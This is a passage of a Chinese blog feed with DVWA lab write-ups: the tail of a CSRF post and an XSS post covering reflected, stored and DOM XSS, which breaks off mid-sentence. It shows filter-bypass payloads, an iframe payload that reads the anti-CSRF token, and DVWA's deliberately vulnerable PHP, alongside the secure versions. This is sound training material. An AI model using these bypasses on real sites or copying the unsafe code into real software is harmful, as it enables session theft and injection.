class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName=&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt;&amp;mtxMessage=1222</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091431190.png" alt></p><p>或者用XSS获取COOKIE</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091441244.png" alt></p><p>然后改COOKIE以及要改的密码</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091448561.png" alt></p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$pass_curr = $_GET[ &apos;password_current&apos; ];</span><br><span class="line">$pass_new = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">$pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">// Sanitise current password input</span><br><span class="line">$pass_curr = stripslashes( $pass_curr );</span><br><span class="line">$pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">// Check that the current password is correct</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">$data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">// Do both new passwords match and does the current password match the user?</span><br><span class="line">if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123;</span><br><span class="line">// It does!</span><br><span class="line">$pass_new = stripslashes( $pass_new );</span><br><span class="line">$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">// Update database with new password</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">// Feedback for the user</span><br><span class="line">echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Issue with passwords matching</span><br><span class="line">echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>加入了PDO预编译语句防止SQL注入，防止CSRF不仅用了token，还要求用户输入原密码，这样在不知道原密码的情况下就无法构造参数。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;DVWA学习（六）CSRF&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="DVWA" scheme="http://archimesan.me/categories/CTF/DVWA/"/>
    
    
      <category term="DVWA" scheme="http://archimesan.me/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>DVWA学习（五）XSS</title>
    <link href="http://archimesan.me/2018/05/18/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89XSS/"/>
    <id>http://archimesan.me/2018/05/18/DVWA学习（五）XSS/</id>
    <published>2018-05-18T12:16:48.000Z</published>
    <updated>2019-03-26T15:22:48.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（五）XSS<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。</p><p>根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p><p>DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。</p><h1 id="Reflected-Cross-Site-Scripting-反射型XSS"><a href="#Reflected-Cross-Site-Scripting-反射型XSS" class="headerlink" title="Reflected Cross Site Scripting (反射型XSS)"></a>Reflected Cross Site Scripting (反射型XSS)</h1><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>输入的数据会显示在当前页面中，尝试输<code>name=aaaa&lt;&gt;&#39;/&quot;</code>发现没有任何过滤</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083603057.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083614210.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083642518.png" alt></p><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><code>array_key_exists</code>检查数组中是否有指定的键名<br>传入的name参数没有任何过滤就输出到页面上。</p><h2 id="Medium难度"><a href="#Medium难度" class="headerlink" title="Medium难度"></a>Medium难度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=aaaa&lt;&gt;&apos;/&quot;,发现没有过滤&lt;&gt;&apos;/&quot;。</span><br></pre></td></tr></table></figure><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083752531.png" alt></p><p>尝试插入JS语句<code>name=&lt;script&gt;alert(1)&lt;/script&gt;</code>没有弹窗查看源码，<code>&lt;script&gt;</code> 被过滤了。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083805227.png" alt></p><p><strong>尝试用大小写绕过</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083827499.png" alt></p><p><code>**&lt;script/&gt;**</code>也可以绕过</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083916236.png" alt></p><p><strong>双写</strong><code>&lt;script&gt;</code>绕过</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083958162.png" alt></p><p><strong>过滤了script可以用img标签</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084009644.png" alt></p><p><strong>body标签</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084022108.png" alt></p><p><strong>iframe标签</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084100081.png" alt></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084111054.png" alt></p><p><strong>input标签</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084124173.png" alt></p><p>还有很多。</p><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>只过滤了<code>&lt;script&gt;</code>。</p><h2 id="High难度"><a href="#High难度" class="headerlink" title="High难度"></a>High难度</h2><p>同样没有过滤<code>aaaa&lt;&gt;&#39;/&quot;name=&lt;script&gt;alert(1)&lt;/script&gt;</code>就剩下了个&gt;</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084203238.png" alt></p><p><strong>用img标签</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084224614.png" alt></p><p>同样可以用iframe和body等标签。</p><p><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>源码把<code>&lt;script&gt;</code>替换为空.</p><h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>使用<code>htmlspecialchars</code>函数把预定义的字符<code>&amp;、”、 ’、&lt;、&gt;</code>转换为 HTML 实体，防止浏览器将其作为HTML元素。</p><h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><h2 id="LOW级别-1"><a href="#LOW级别-1" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>输入测试数据 <code>aaa&lt;&gt;&quot;/&#39;</code></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084446625.png" alt></p><p><strong>查看源代码发现没有任何过滤</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084334078.png" alt></p><p>但是name限制输入字符为10个,可以用hackbar改包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;mtxMessage=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084509245.png" alt></p><p><strong>查看源代码</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084334078.png" alt></p><p><strong>源码</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">$name = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">// Sanitize message input</span><br><span class="line">$message = stripslashes( $message );</span><br><span class="line">$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Sanitize name input</span><br><span class="line">$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Update database</span><br><span class="line">$query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>trim</code>函数去掉字符序列左边和右边的空格。<br><code>stripslashes</code>函数删除<code>message</code>中的反斜杠。<br><code>mysqli_real_escape_string</code>函数转义<code>name</code>和<code>message</code>中的<code>\x00 ，\n，\r，\ ， &#39;，&quot; ， \x1a</code><br>没有做XSS方面的过滤与检查，并且存储在数据库中，所以存在出存储型XSS。</p><h2 id="Medium难度-1"><a href="#Medium难度-1" class="headerlink" title="Medium难度"></a>Medium难度</h2><p>同样输入<code>txtName=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;mtxMessage=&lt;script&gt;alert(/\xss/)&lt;/script&gt;</code>前者被过滤了<code>&lt;script&gt;</code>，后者<code>script</code>标签都被过滤</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085048978.png" alt></p><p>尝试大小写<code>script</code>绕过，<code>name</code>成功弹窗，<code>message</code>仍然过滤</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085100528.png" alt></p><p><strong>源码</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">$name = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">// Sanitize message input</span><br><span class="line">$message = strip_tags( addslashes( $message ) );</span><br><span class="line">$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">// Sanitize name input</span><br><span class="line">$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );</span><br><span class="line">$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Update database</span><br><span class="line">$query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>strip_tags函数剥去字符串中的 HTML 标签。但是仍然可以使用<b>标签<br>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。<br>message参数使用了htmlspecialchars函数进行HTML编码，无法注入XSS代码。</b></p><h2 id="High难度-1"><a href="#High难度-1" class="headerlink" title="High难度"></a>High难度</h2><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">$name = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">// Sanitize message input</span><br><span class="line">$message = strip_tags( addslashes( $message ) );</span><br><span class="line">$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">// Sanitize name input</span><br><span class="line">$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );</span><br><span class="line">$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Update database</span><br><span class="line">$query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>name过滤了<code>&lt;script</code>,使用其他标签如<code>iframe</code>即可。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085350565.png" alt></p><p><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">$name = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">// Sanitize message input</span><br><span class="line">$message = stripslashes( $message );</span><br><span class="line">$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">// Sanitize name input</span><br><span class="line">$name = stripslashes( $name );</span><br><span class="line">$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">// Update database</span><br><span class="line">$data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>采用了token机制防止CSRF攻击，对name和message都采用htmlspecialchars函数编码防止XSS，sql语句用pdo对象防止SQL注入。</p><h1 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h1><h2 id="LOW级别-2"><a href="#LOW级别-2" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>是个下拉框，不过可以抓包改参数</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085427650.png" alt></p><p><strong>查看源代码</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085440616.png" alt></p><p>indexOf() 